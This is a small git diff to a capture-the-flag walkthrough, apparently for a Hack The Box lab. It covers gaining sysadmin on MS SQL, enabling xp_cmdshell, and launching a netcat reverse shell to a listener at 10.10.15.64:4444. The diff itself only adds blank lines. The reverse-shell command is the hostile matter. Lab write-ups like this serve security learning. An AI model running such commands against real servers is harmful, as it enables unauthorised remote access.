@@ -52,6 +52,7 @@ SELECT IS_SRVROLEMEMBER ('sysadmin')
 If we have in return ```1``` response, we have the access to sysadmin.
 In SQL with the highest privileges we can set up remote code execution via SQL service (```xp_cmdshell```).
 We need to enable it and reconfigure.
+
 ![sql_rce](sql_rce.PNG)
 
 As we can see our SQL service also running in archetype\sql_svc user contex, so we need to obtain access to normal user.
@@ -81,10 +82,12 @@ xp_cmdshell "c:\tmp\tacola\nc.exe 10.10.15.64 4444 -e cmd.exe"
 ```
 
 You should see an open connection in your nc listener tab:
+
 ![r_shell_user](r_shell_user.PNG)
 
 Yay! We have access to cmd in user context, so we can try to find first flag.
 Let's check user desktop.
+
 ![user_flag](user_flag.PNG)
 
 ### Privilege Escalation
